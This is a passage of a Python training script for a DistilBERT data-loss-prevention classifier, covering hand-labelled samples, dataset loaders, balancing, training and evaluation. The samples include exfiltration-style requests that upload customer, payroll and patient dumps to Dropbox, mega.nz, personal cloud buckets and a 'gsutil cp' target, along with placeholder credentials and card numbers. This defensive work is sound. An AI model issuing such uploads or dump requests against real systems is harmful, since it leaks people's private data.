    ("POST /api/files HTTP/1.1\nHost: dropbox.com\nfilename=acquisition_due_diligence.pdf\nContent: Confidential M&A due diligence findings. Not for distribution.", "Confidential"),

    # JSON — confidential business payloads
    ('{"classification": "confidential", "subject": "merger_target", "company": "TechCorp", "valuation": "2.1B", "board_approved": false, "announcement_date": "TBD"}', "Confidential"),
    ('{"report": "financial_forecast", "quarter": "Q4", "revenue_delta": -0.18, "distribution": "executive_only", "embargoed": true}', "Confidential"),
    ('{"document_type": "NDA", "parties": ["ACME Corp", "GlobalTech"], "status": "pending_signature", "confidentiality_level": "strictly_confidential"}', "Confidential"),

    # REST API — confidential operations
    ("POST /api/v1/documents HTTP/1.1\nAuthorization: Bearer eyJhbGc\nContent-Type: application/json\n{\"type\": \"board_resolution\", \"classification\": \"confidential\", \"content\": \"Stock buyback approved\"}", "Confidential"),
    ("PUT /api/compensation/bands HTTP/1.1\n{\"role\": \"Senior Engineer\", \"band_min\": 120000, \"band_max\": 180000, \"effective_date\": \"2024-01-01\", \"visibility\": \"hr_exec_only\"}", "Confidential"),

    # ── RESTRICTED — web content ──────────────────────────────────────────

    # URL-encoded PII form data
    ("cardNumber=4111111111111111&cvv=123&expiryMonth=12&expiryYear=26&cardholderName=John+Doe&billingZip=10001", "Restricted"),
    ("ssn=123-45-6789&dateOfBirth=1985-04-12&firstName=John&lastName=Doe&address=123+Main+St&insuranceId=BC123456", "Restricted"),
    ("nationalId=29001011234567&fullName=Ahmed+Hassan&dateOfBirth=1990-05-20&bankAccount=1234567890123456", "Restricted"),
    ("username=admin&password=Sup3rS3cr3t%21&db=production&host=db.internal.com&port=5432", "Restricted"),
    ("email=user%40 company.com&password=MyP%40ssw0rd&mfaCode=123456&sessionToken=abc123xyz", "Restricted"),

    # JSON — PII and credential payloads
    ('{"ssn": "123-45-6789", "dob": "1985-04-12", "name": "John Doe", "account": "9876543210", "routing": "021000021"}', "Restricted"),
    ('{"card_number": "4111111111111111", "cvv": "123", "expiry": "12/26", "cardholder": "Ahmed Hassan", "billing_zip": "11371"}', "Restricted"),
    ('{"patient_id": "PAT-001", "name": "Sarah Johnson", "dob": "1990-03-15", "diagnosis": "HIV+", "medication": "ART", "national_id": "29001011234567"}', "Restricted"),
    ('{"db_host": "prod-db.internal", "db_user": "root", "db_password": "Adm1n@Pr0d", "db_name": "customers_prod", "port": 5432}', "Restricted"),
    ('{"aws_access_key": "AKIAI44QH8DHBEXAMPLE", "aws_secret": "je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY", "region": "us-east-1"}', "Restricted"),
    ('{"employee_id": "EMP-12345", "name": "Mohamed Ali", "national_id": "29001011234567", "salary": 25000, "bank_account": "1234567890123456", "iban": "EG380019000500000000263180002"}', "Restricted"),

    # HTTP POST — database and file exports
    ("POST /upload HTTP/1.1\nHost: dropbox.com\nfilename=customer_db_export.csv\nContent: customer_id,national_id,credit_card,cvv,billing_address — full export 80000 records", "Restricted"),
    ("POST /api/export HTTP/1.1\nContent-Type: application/octet-stream\nfilename=payroll_export_2024.csv\nContent: employee_id,full_name,bank_routing,account_number,net_salary", "Restricted"),
    ("POST /s3/upload HTTP/1.1\nHost: s3.amazonaws.com\nBucket: company-backups\nKey: patient_records_dump.sql\nContent: Patient SSN, DOB, diagnosis, medications — 3400 records", "Restricted"),

    # Cloud storage — shadow IT uploads of sensitive files
    ("POST /upload HTTP/1.1\nHost: personal.onedrive.com\nfilename=HR_salary_database_full.xlsx\nContent: All employee salaries, bank accounts, national IDs — confidential payroll data", "Restricted"),
    ("POST /api/upload HTTP/1.1\nHost: mega.nz\nfilename=source_code_proprietary.zip\nContent: Proprietary trading algorithms and API keys — internal repository dump", "Restricted"),

    # GraphQL — sensitive queries
    ("POST /graphql HTTP/1.1\nContent-Type: application/json\n{\"query\": \"{ users { id email password_hash ssn credit_card national_id salary } }\"}", "Restricted"),
    ("POST /graphql HTTP/1.1\n{\"query\": \"mutation { exportCustomerData(format: CSV, includeFields: [ssn, card_number, dob, address]) { downloadUrl } }\"}", "Restricted"),

    # WebSocket — real-time credential leak
    ("WS /chat\n{\"type\": \"message\", \"content\": \"The DB password is Admin@123 and the API key is sk-prod-9f2k\"}", "Restricted"),
    ("WS /stream\n{\"event\": \"user_data\", \"payload\": {\"ssn\": \"987-65-4321\", \"card\": \"4111111111111111\", \"cvv\": \"321\"}}", "Restricted"),

    # Base64 encoded sensitive data (common in web traffic)
    ("POST /api/data HTTP/1.1\nContent-Type: application/json\n{\"data\": \"eyJzc24iOiAiMTIzLTQ1LTY3ODkiLCAiY2FyZCI6ICI0MTExMTExMTExMTExMTExIn0=\", \"encoding\": \"base64\"}", "Restricted"),

    # Cookie / session data leaks
    ("Cookie: session_id=abc123; auth_token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjM0fQ; db_password=Admin123; api_key=sk-prod-9f2k", "Restricted"),
    ("Set-Cookie: admin_token=SuperSecretToken123; HttpOnly=false; Secure=false; SameSite=None", "Restricted"),

    # Pastebin / code sharing — credential exposure
    ("https://pastebin.com/raw/abc123\nDB_HOST=prod.internal.company.com\nDB_USER=admin\nDB_PASS=Pr0duct10n!\nSTRIPE_KEY=sk_live_51Hx9Y2\nSENDGRID_KEY=SG.abc123xyz", "Restricted"),

    # HTML form — PII submission
    ('<form action="/payment"><input name="card_number" value="4111111111111111"><input name="cvv" value="123"><input name="ssn" value="123-45-6789"></form>', "Restricted"),
    ('<input type="hidden" name="national_id" value="29001011234567"><input name="dob" value="1990-05-20"><input name="password" value="MySecret123">', "Restricted"),

    # Multipart upload — sensitive files
    ("Content-Disposition: form-data; name=\"file\"; filename=\"patient_records.xlsx\"\nContent-Type: application/vnd.ms-excel\nSSN, DOB, diagnosis, credit_card for 3400 patients", "Restricted"),
    ("Content-Disposition: form-data; name=\"file\"; filename=\"credentials.env\"\nContent-Type: text/plain\nDB_PASSWORD=Admin@123\nAWS_SECRET=wJalrXUtnFEMI\nAPI_KEY=sk-prod-9f2k", "Restricted"),
    ("Content-Disposition: form-data; name=\"file\"; filename=\"payroll_Q4.csv\"\nemployee_id,name,national_id,bank_account,routing,net_salary\n12345,Ahmed,29001011234567,123456789,021000021,25000", "Restricted"),

    # S3 / GCS / Azure Blob — cloud exfiltration
    ("PUT /company-data/exports/customer_full_dump.csv HTTP/1.1\nHost: s3.amazonaws.com\nContent-Type: text/csv\ncustomer_id,email,ssn,credit_card,cvv,billing_address — 80000 records", "Restricted"),
    ("POST /upload/blob HTTP/1.1\nHost: myaccount.blob.core.windows.net\nContainer: personal-backup\nBlob: HR_payroll_all_employees.xlsx\nContent: salary, bank account, national ID data", "Restricted"),
    ("gsutil cp employee_biometrics.zip gs://personal-bucket/\nContent: Fingerprint hashes and face embeddings for 2000 employees", "Restricted"),

    # REST API — data extraction attempts
    ("GET /api/v1/users?fields=ssn,credit_card,dob,national_id&export=true&format=csv HTTP/1.1\nAuthorization: Bearer compromised_token", "Restricted"),
    ("GET /api/admin/dump?table=customers&include_pii=true&include_payment=true HTTP/1.1\nX-Admin-Key: leaked_admin_key_12345", "Restricted"),
]


# ══════════════════════════════════════════════════════════════════════════
# SECTION 3 — AUGMENTATION
# ══════════════════════════════════════════════════════════════════════════

def augment_text(text: str) -> str:
    transforms = [
        lambda t: "Please see attached: " + t,
        lambda t: "FYI: " + t,
        lambda t: "For your reference: " + t,
        lambda t: "Note: " + t,
        lambda t: t + " Please handle accordingly.",
        lambda t: t + " Do not forward without approval.",
        lambda t: t + " For authorized personnel only.",
        lambda t: ". ".join(t.split(". ")[1:]).strip() if ". " in t else t,
    ]
    result = random.choice(transforms)(text).strip()
    return result if len(result) >= 15 else text

def oversample_class(samples: list, target_count: int) -> list:
    if len(samples) >= target_count:
        return samples[:target_count]
    result = list(samples)
    while len(result) < target_count:
        text, label = random.choice(samples)
        result.append((augment_text(text), label))
    return result


# ══════════════════════════════════════════════════════════════════════════
# SECTION 4 — HUGGINGFACE LOADERS
# ══════════════════════════════════════════════════════════════════════════

def load_pii_dataset(max_samples=MAX_PER_HF_DATASET):
    data = []
    try:
        from datasets import load_dataset
        print(f"  [HF] ai4privacy/pii-masking-400k...")
        ds = load_dataset("ai4privacy/pii-masking-400k",
                          split=f"train[:{max_samples * 2}]")
        for item in ds:
            text    = item.get("source_text", "")
            has_pii = bool(item.get("privacy_mask"))
            label   = "Restricted" if has_pii else "Public"
            data.append((text[:400], label))
            if len(data) >= max_samples:
                break
        data = clean_dataset(data, "pii-masking")
        print(f"    -> {Counter(l for _, l in data)}")
    except Exception as e:
        print(f"    SKIPPED -- {e}")
    return data


def load_medical_dataset(max_samples=MAX_PER_HF_DATASET):
    data = []
    try:
        from datasets import load_dataset
        print(f"  [HF] medical_meadow_medical_flashcards...")
        ds = load_dataset("medalpaca/medical_meadow_medical_flashcards",
                          split=f"train[:{max_samples}]")
        for item in ds:
            text = (item.get("input", "") + " " + item.get("output", "")).strip()
            data.append((text[:400], "Restricted"))
            if len(data) >= max_samples:
                break
        data = clean_dataset(data, "medical_flashcards")
        print(f"    -> {len(data)} Restricted")
    except Exception as e:
        print(f"    SKIPPED -- {e}")
    return data

def load_enron_hf_dataset(max_samples=MAX_PER_HF_DATASET):
    data = []
    try:
        from datasets import load_dataset
        print(f"  [HF] aeslc/Enron...")
        ds = load_dataset("aeslc", split=f"train[:{max_samples * 4}]")
        restricted_kw   = ["ssn","social security","password","credit card","account number",
                            "private key","patient","medical record","date of birth",
                            "diagnosis","prescription","hipaa","routing number","dob"]
        confidential_kw = ["merger","acquisition","layoff","settlement","attorney","privileged",
                            "board approval","earnings","forecast","projected revenue","nda",
                            "term sheet","due diligence","confidential","strictly confidential",
                            "embargoed","not for distribution","executive only","eyes only",
                            "trade secret","workforce reduction","personnel action"]
        internal_kw     = ["internal","do not forward","do not share","team only",
                            "management only","not for client","staff only","internal use",
                            "intranet","budget","roadmap","org chart","headcount","kpi",
                            "sprint","backlog","escalation"]
        for item in ds:
            text = (item.get("email_body", "") or "").strip()[:400]
            if len(text) < 20:
                continue
            tl = text.lower()
            if any(k in tl for k in restricted_kw):
                label = "Restricted"
            elif any(k in tl for k in confidential_kw):
                label = "Confidential"
            elif any(k in tl for k in internal_kw):
                label = "Internal"
            else:
                label = "Internal"
            data.append((text, label))
            if len(data) >= max_samples:
                break
        data = clean_dataset(data, "enron_hf")
        print(f"    -> {Counter(l for _, l in data)}")
    except Exception as e:
        print(f"    SKIPPED -- {e}")
    return data


# ══════════════════════════════════════════════════════════════════════════
# SECTION 5 — KAGGLE LOADERS
# ══════════════════════════════════════════════════════════════════════════

def load_kaggle_pii(csv_path=KAGGLE_PII_CSV, max_samples=MAX_PER_HF_DATASET):
    data = []
    try:
        if not Path(csv_path).exists():
            print(f"  [Kaggle PII] {csv_path} not found -- SKIPPED")
            return data
        print(f"  [Kaggle] PII detection dataset...")
        df = pd.read_csv(csv_path)
        for _, row in df.iterrows():
            text = str(row["text"])
            raw  = str(row["labels"])
            has_pii = any(tag not in ("O","[]","")
                         for tag in re.split(r"[\s,\[\]'\"]+", raw) if tag)
            label = "Restricted" if has_pii else "Public"
            data.append((text[:400], label))
            if len(data) >= max_samples:
                break
        data = clean_dataset(data, "kaggle_pii")
        print(f"    -> {Counter(l for _, l in data)}")
    except Exception as e:
        print(f"    [Kaggle PII] Error -- {e}")
    return data


def load_kaggle_email_classification(csv_path=KAGGLE_EMAIL_CSV,
                                     max_samples=MAX_PER_HF_DATASET):
    """
    FIX 2: SMS ham messages relabeled Public (not Internal).
    Ham SMS = casual text messages, not corporate Internal documents.
    Mislabeling them as Internal was flooding Internal with noise and
    causing any plain casual text to be predicted as Internal.
    """
    data = []
    try:
        if not Path(csv_path).exists():
            print(f"  [Kaggle Email] {csv_path} not found -- SKIPPED")
            return data
        print(f"  [Kaggle] Email classification dataset...")
        df = pd.read_csv(csv_path, encoding="latin-1")
        pii_patterns = re.compile(
            r"password|credit.?card|\bssn\b|social.security|account.number"
            r"|verify.your|confirm.your.details|your.account.has.been", re.I
        )
        for _, row in df.iterrows():
            text = str(row["Message_body"])
            cat  = str(row["Label"]).lower().strip()
            if cat == "ham":
                label = "Public"       # FIX 2: was Internal, now Public
            elif cat == "spam":
                if pii_patterns.search(text):
                    label = "Restricted"
                else:
                    continue
            else:
                label = "Public"
            data.append((text[:400], label))
            if len(data) >= max_samples:
                break
        data = clean_dataset(data, "kaggle_email")
        print(f"    -> {Counter(l for _, l in data)}")
    except Exception as e:
        print(f"    [Kaggle Email] Error -- {e}")
    return data


def load_kaggle_spam(csv_path=KAGGLE_SPAM_CSV, max_samples=MAX_PER_HF_DATASET):
    data = []
    try:
        if not Path(csv_path).exists():
            print(f"  [Kaggle Spam] {csv_path} not found -- SKIPPED")
            return data
        print(f"  [Kaggle] Spam/Ham dataset...")
        df = pd.read_csv(csv_path, encoding="latin-1")
        pii_patterns = re.compile(
            r"password|credit.?card|\bssn\b|social.security|account.number"
            r"|verify.your|confirm.your.details|your.account.has.been", re.I
        )
        for _, row in df.iterrows():
            text  = str(row["text"])
            ltype = str(row["label"]).lower().strip()
            if "ham" in ltype:
                label = "Public"
            elif "spam" in ltype:
                if pii_patterns.search(text):
                    label = "Restricted"
                else:
                    continue
            else:
                label = "Public"
            data.append((text[:400], label))
            if len(data) >= max_samples:
                break
        data = clean_dataset(data, "kaggle_spam")
        print(f"    -> {Counter(l for _, l in data)}")
    except Exception as e:
        print(f"    [Kaggle Spam] Error -- {e}")
    return data


def load_kaggle_enron(csv_path=KAGGLE_ENRON_CSV, max_samples=MAX_PER_HF_DATASET):
    data = []
    try:
        if not Path(csv_path).exists():
            print(f"  [Kaggle Enron] {csv_path} not found -- SKIPPED")
            return data
        print(f"  [Kaggle] Enron email dataset...")
        df = pd.read_csv(csv_path, nrows=max_samples * 5)
        restricted_kw   = ["ssn","social security","password","credit card","account number",
                            "private key","patient","medical","date of birth","diagnosis",
                            "routing number"]
        confidential_kw = ["merger","acquisition","layoff","settlement","attorney","privileged",
                            "earnings","forecast","projected","nda","term sheet","confidential",
                            "embargoed","eyes only","workforce reduction"]
        internal_kw     = ["internal","do not forward","management only","not for distribution",
                            "budget","roadmap","headcount","org chart","escalation"]
        for _, row in df.iterrows():
            raw  = str(row["message"])
            body = re.split(r"\n\s*\n", raw, maxsplit=2)[-1].strip()[:400]
            if len(body) < 20:
                continue
            tl = body.lower()
            if any(k in tl for k in restricted_kw):
                label = "Restricted"
            elif any(k in tl for k in confidential_kw):
                label = "Confidential"
            elif any(k in tl for k in internal_kw):
                label = "Internal"
            else:
                label = "Internal"
            data.append((body, label))
            if len(data) >= max_samples:
                break
        data = clean_dataset(data, "kaggle_enron")
        print(f"    -> {Counter(l for _, l in data)}")
    except Exception as e:
        print(f"    [Kaggle Enron] Error -- {e}")
    return data

def load_llm_synthetic(json_path=SYENTHETIC_DATA_JSON):
    
    data = []

    try:
        if not Path(json_path).exists():
            print(f"  [LLM Synthetic] File not found: {json_path}")
            return data

        print(f"  [LLM Synthetic] Loading from {json_path}")

        with open(json_path, "r", encoding="utf-8") as f:
            samples = json.load(f)

        for sample in samples:
            text = str(sample.get("text", "")).strip()
            label = str(sample.get("label", "")).strip()

            if not text or label not in (
                "Public",
                "Internal",
                "Confidential",
                "Restricted"
            ):
                continue

            # Keep same length limits used by the classifier
            text = text[:1500]

            data.append((text, label))

        # Reuse your existing cleaning pipeline
        data = clean_dataset(data, "llm_synthetic")

        print(f"    Loaded {len(data)} synthetic samples")
        print(f"    Distribution: {Counter(label for _, label in data)}")

        return data

    except Exception as e:
        print(f"  [LLM Synthetic] Error loading dataset: {e}")
        return []
# ══════════════════════════════════════════════════════════════════════════
# SECTION 6 — GLOBAL DEDUPLICATION + HOLDOUT LEAKAGE CHECK
# ══════════════════════════════════════════════════════════════════════════

def global_deduplicate(all_data: list, holdout_texts: set) -> list:
    holdout_fps = {text_fingerprint(t) for t in holdout_texts}
    before = len(all_data)
    all_data = [(t, l) for t, l in all_data if text_fingerprint(t) not in holdout_fps]
    leaked = before - len(all_data)
    if leaked:
        print(f"  Removed {leaked} samples that appear in holdout set")
    all_data = deduplicate(all_data)
    print(f"  Global dedup: {before} -> {len(all_data)}")
    return all_data


# ══════════════════════════════════════════════════════════════════════════
# SECTION 7 — DATASET BALANCING
# FIX 3: Public class uses its real count (uncapped) to avoid starving it.
# ══════════════════════════════════════════════════════════════════════════

def balance_dataset(data: list, floor=TARGET_FLOOR, ceil=TARGET_CEIL) -> list:
    by_class = {l: [] for l in LABELS}
    for text, label in data:
        if label in by_class:
            by_class[label].append((text, label))

    balanced = []
    print(f"\n  Balancing (floor={floor}, ceil={ceil}, Public uncapped):")
    for label in LABELS:
        items = by_class[label]
        random.shuffle(items)
        if label == "Public":
            # FIX 3: never cap Public — it needs all samples it can get
            note = f"kept all ({len(items)})"
        elif len(items) > ceil:
            items = items[:ceil]
            note = f"capped -> {ceil}"
        elif len(items) < floor:
            before_count = len(items)
            items = oversample_class(items, floor)
            note = f"oversampled {before_count} -> {len(items)}"
        else:
            note = f"unchanged ({len(items)})"
        print(f"    {label:<14}: {len(items):>4}  {note}")
        balanced.extend(items)

    random.shuffle(balanced)
    return balanced


# ══════════════════════════════════════════════════════════════════════════
# SECTION 8 — CLASS WEIGHTS
# ══════════════════════════════════════════════════════════════════════════

def compute_class_weights(data: list) -> torch.Tensor:
    counts  = Counter(LABEL2ID[l] for _, l in data)
    total   = sum(counts.values())
    weights = [total / (len(LABELS) * counts.get(i, 1)) for i in range(len(LABELS))]
    print(f"\n  Class weights: { {LABELS[i]: round(w, 3) for i, w in enumerate(weights)} }")
    return torch.tensor(weights, dtype=torch.float)


# ══════════════════════════════════════════════════════════════════════════
# SECTION 9 — PYTORCH DATASET & WEIGHTED TRAINER
# ══════════════════════════════════════════════════════════════════════════

class DLPDataset(Dataset):
    def __init__(self, encodings, labels):
        self.encodings = encodings
        self.labels    = labels
    def __len__(self):
        return len(self.labels)
    def __getitem__(self, idx):
        item = {k: torch.tensor(v[idx]) for k, v in self.encodings.items()}
        item["labels"] = torch.tensor(self.labels[idx])
        return item

class WeightedTrainer(Trainer):
    def __init__(self, class_weights, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.class_weights = class_weights
    def compute_loss(self, model, inputs, return_outputs=False, **kwargs):
        labels  = inputs.pop("labels")
        outputs = model(**inputs)
        logits  = outputs.logits
        loss_fn = torch.nn.CrossEntropyLoss(weight=self.class_weights.to(logits.device))
        loss    = loss_fn(logits, labels)
        return (loss, outputs) if return_outputs else loss


# ══════════════════════════════════════════════════════════════════════════
# SECTION 10 — LOSS LOGGER CALLBACK
# ══════════════════════════════════════════════════════════════════════════

class LossLoggerCallback(TrainerCallback):
    def __init__(self):
        self.history      = []
        self._loss_buffer = []

    def on_log(self, args, state, control, logs=None, **kwargs):
        if logs and "loss" in logs:
            self._loss_buffer.append(float(logs["loss"]))

    def on_evaluate(self, args, state, control, metrics=None, **kwargs):
        mean_train = (round(sum(self._loss_buffer) / len(self._loss_buffer), 4)
                      if self._loss_buffer else None)
        self.history.append({
            "epoch":      round(state.epoch, 2) if state.epoch else 0,
            "train_loss": mean_train,
            "eval_loss":  round(metrics.get("eval_loss", 0), 4),
        })
        self._loss_buffer = []


def detect_overfitting(log_history: list) -> None:
    entries = [e for e in log_history if e.get("train_loss") and e.get("eval_loss")]
    if len(entries) < 3:
        print("  Not enough epochs to assess overfitting.")
        return
    print(f"\n  {'Epoch':>6}  {'Train Loss':>11}  {'Eval Loss':>10}")
    print("  " + "-" * 34)
    for e in entries:
        print(f"  {e['epoch']:>6}  {str(e.get('train_loss','-')):>11}  {e['eval_loss']:>10}")
    last        = entries[-3:]
    train_trend = last[-1]["train_loss"] - last[0]["train_loss"]
    eval_trend  = last[-1]["eval_loss"]  - last[0]["eval_loss"]
    if train_trend < -0.01 and eval_trend > 0.01:
        print("\n  WARNING: OVERFITTING DETECTED")
    elif eval_trend <= 0:
        print("\n  OK: No overfitting detected.")
    else:
        print("\n  INFO: eval_loss trend is ambiguous.")


# ══════════════════════════════════════════════════════════════════════════
# SECTION 11 — STRATIFIED SPLIT
# ══════════════════════════════════════════════════════════════════════════

def stratified_split(data: list, test_size=0.2, seed=42):
    texts  = [d[0] for d in data]
    labels = [LABEL2ID[d[1]] for d in data]
    sss    = StratifiedShuffleSplit(n_splits=1, test_size=test_size, random_state=seed)
    train_idx, test_idx = next(sss.split(texts, labels))
    return [data[i] for i in train_idx], [data[i] for i in test_idx]


# ══════════════════════════════════════════════════════════════════════════
# SECTION 12 — EVALUATION
# ══════════════════════════════════════════════════════════════════════════

def evaluate_model(model, tokenizer, test_data: list) -> None:
    model.eval()
    predictions, ground_truth = [], []
    for text, expected_label in test_data:
        inputs = tokenizer(text, return_tensors="pt",
                           truncation=True, padding=True, max_length=MAX_LENGTH)
        with torch.no_grad():
            logits = model(**inputs).logits
        pred_id = torch.argmax(logits).item()
        predictions.append(ID2LABEL[pred_id])
        ground_truth.append(expected_label)
    correct = sum(p == g for p, g in zip(predictions, ground_truth))
    print(f"\nTest accuracy: {correct}/{len(predictions)} = {correct/len(predictions):.1%}")
    print("\nClassification report:")
    print(classification_report(ground_truth, predictions,
                                target_names=LABELS, zero_division=0))
    print("Confusion matrix (rows=actual, cols=predicted):")
    print(pd.DataFrame(
        confusion_matrix(ground_truth, predictions, labels=LABELS),
        index=[f"actual_{l}" for l in LABELS],
        columns=[f"pred_{l}" for l in LABELS]
    ).to_string())


# ══════════════════════════════════════════════════════════════════════════
# SECTION 13 — BLIND HOLDOUT TEST
# ══════════════════════════════════════════════════════════════════════════

def run_blind_holdout_test(model, tokenizer) -> None:
    if not Path(HOLDOUT_PATH).exists():
        print(f"\n  holdout_test.json not found at '{HOLDOUT_PATH}' -- skipping.")
        return
    with open(HOLDOUT_PATH) as f:
        holdout = json.load(f)
    print("\n" + "=" * 70)
    print("BLIND HOLDOUT TEST (samples never seen during training)")
    print("=" * 70)
    model.eval()
    correct, wrong_cases  = 0, []
    per_class_correct     = Counter()
    per_class_total       = Counter()
    print(f"  {'':2} {'Text':<52} {'Expected':<14} {'Got':<14} {'Conf'}")
    print("  " + "-" * 94)
    for item in holdout:
        text, expected = item["text"], item["label"]
        inputs = tokenizer(text, return_tensors="pt",
                           truncation=True, padding=True, max_length=MAX_LENGTH)
        with torch.no_grad():
            logits = model(**inputs).logits
        probs   = torch.softmax(logits, dim=-1)[0]
        pred_id = torch.argmax(probs).item()
        got     = ID2LABEL[pred_id]
        conf    = probs[pred_id].item()
        mark    = "V" if got == expected else "X"
        if got == expected:
            correct += 1
            per_class_correct[expected] += 1
        else:
            wrong_cases.append((expected, got, text[:60]))
        per_class_total[expected] += 1
        print(f"  {mark}  {text[:51]:<52} {expected:<14} {got:<14} {conf:.1%}")
    total = len(holdout)
    print(f"\n  Blind holdout accuracy: {correct}/{total} = {correct/total:.0%}")
    print("\n  Per-class accuracy on holdout:")
    for label in LABELS:
        c, t = per_class_correct.get(label, 0), per_class_total.get(label, 0)
        print(f"    {label:<14}: {c}/{t} = {f'{c/t:.0%}' if t else 'n/a'}")
    if wrong_cases:
        print("\n  Misclassifications:")
        for expected, got, text in wrong_cases:
            print(f"    Expected {expected:<14} Got {got:<14}: {text}...")


# ══════════════════════════════════════════════════════════════════════════
# SECTION 14 — MAIN
# ══════════════════════════════════════════════════════════════════════════

def main():
    print("=" * 60)
    print("DLP DistilBERT Fine-tuning FINAL v5")
    print("=" * 60)

    random.seed(42)
    np.random.seed(42)
    torch.manual_seed(42)
    torch.backends.cudnn.deterministic = True

    holdout_texts = set()
    if Path(HOLDOUT_PATH).exists():
        with open(HOLDOUT_PATH) as f:
            holdout_texts = {item["text"] for item in json.load(f)}
        print(f"\nLoaded {len(holdout_texts)} holdout texts for leakage check.")
    else:
        print(f"\nWARNING: {HOLDOUT_PATH} not found at {Path(HOLDOUT_PATH).resolve()}")


    print("\n[1/7] Collecting training data...")
    print(f"  Manual examples: {len(MANUAL_DATA)}")
    

    print("\n  HuggingFace:")
    pii_data      = load_pii_dataset()

    medical_data  = load_medical_dataset()
    enron_hf_data = load_enron_hf_dataset()
    print("\nsynthetic:")
    llm_synthetic = load_llm_synthetic()
    print("\n  Kaggle:")
    kaggle_pii   = load_kaggle_pii()
    kaggle_email = load_kaggle_email_classification()
    kaggle_spam  = load_kaggle_spam()
    kaggle_enron = load_kaggle_enron()

    all_data = (MANUAL_DATA + pii_data + medical_data +
                enron_hf_data + kaggle_pii + kaggle_email + kaggle_spam + kaggle_enron + llm_synthetic)

    print("\n[2/7] Global cleaning and deduplication...")
    all_data = clean_dataset(all_data, "combined")
    all_data = global_deduplicate(all_data, holdout_texts)

    print(f"\n  Distribution before balancing:")
    counts = Counter(l for _, l in all_data)
    for label in LABELS:
        print(f"    {label:<14}: {counts.get(label, 0)}")

    print("\n[3/7] Balancing...")
    balanced_data = balance_dataset(all_data)
    print(f"\n  Total after balancing: {len(balanced_data)}")

    print("\n[4/7] Saving dataset...")
    os.makedirs("ai/training_data", exist_ok=True)
    pd.DataFrame(balanced_data, columns=["text","label"]).to_csv(CSV_PATH, index=False)
    print(f"  Saved to {CSV_PATH}")

    print("\n[5/7] Stratified train/test split (80/20)...")
    train_data, test_data = stratified_split(balanced_data)
    train_texts      = [d[0] for d in train_data]
    train_labels_int = [LABEL2ID[d[1]] for d in train_data]
    test_texts       = [d[0] for d in test_data]
    test_labels_int  = [LABEL2ID[d[1]] for d in test_data]
    print(f"\n  {'Label':<14} {'Train':>7} {'Test':>7}")
    train_c = Counter(d[1] for d in train_data)
    test_c  = Counter(d[1] for d in test_data)
    for label in LABELS:
        print(f"  {label:<14} {train_c.get(label,0):>7} {test_c.get(label,0):>7}")

    print(f"\n[6/7] Tokenizing ({BASE_MODEL})...")
    os.makedirs(SAVE_PATH, exist_ok=True)
    tokenizer     = AutoTokenizer.from_pretrained(BASE_MODEL)
    model         = AutoModelForSequenceClassification.from_pretrained(
        BASE_MODEL, num_labels=len(LABELS), id2label=ID2LABEL, label2id=LABEL2ID)
    train_enc     = tokenizer(train_texts, truncation=True, padding=True, max_length=MAX_LENGTH)
    test_enc      = tokenizer(test_texts,  truncation=True, padding=True, max_length=MAX_LENGTH)
    train_dataset = DLPDataset(train_enc, train_labels_int)
    test_dataset  = DLPDataset(test_enc,  test_labels_int)
    class_weights = compute_class_weights(train_data)

    print("\n[7/7] Training...")
    loss_logger  = LossLoggerCallback()
    total_steps  = (len(train_dataset) // 8) * 8
    warmup_steps = int(total_steps * 0.1)

    args = TrainingArguments(
        output_dir                  = SAVE_PATH,
        num_train_epochs            = 8,        # FIX 1: was 3, best model always ~ep 3-5
        per_device_train_batch_size = 8,
        per_device_eval_batch_size  = 8,
        learning_rate               = 2e-5,
        weight_decay                = 0.01,
        eval_strategy               = "epoch",
        save_strategy               = "epoch",
        logging_strategy            = "epoch",
        load_best_model_at_end      = True,
        metric_for_best_model       = "eval_loss",
        greater_is_better           = False,
        report_to                   = "none",
        warmup_steps                = warmup_steps,
    )

    trainer = WeightedTrainer(
        class_weights = class_weights,
        model         = model,
        args          = args,
        train_dataset = train_dataset,
        eval_dataset  = test_dataset,
        callbacks     = [
            EarlyStoppingCallback(early_stopping_patience=2),  # FIX 1: patience=2
            loss_logger,
        ],
    )

    trainer.train()
    trainer.save_model(SAVE_PATH)
    tokenizer.save_pretrained(SAVE_PATH)
    print(f"\nModel saved to: {SAVE_PATH}")

    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    with open(LOG_PATH, "w") as f:
        json.dump(loss_logger.history, f, indent=2)
    print(f"Training log saved: {LOG_PATH}")

    print("\n" + "=" * 60)
    print("OVERFITTING CHECK")
    print("=" * 60)
    detect_overfitting(loss_logger.history)

    print("\n" + "=" * 60)
    print("INTERNAL TEST SET EVALUATION")
    print("=" * 60)
    evaluate_model(model, tokenizer, test_data)

    run_blind_holdout_test(model, tokenizer)
    print("\nDone.")


if __name__ == "__main__":
    main()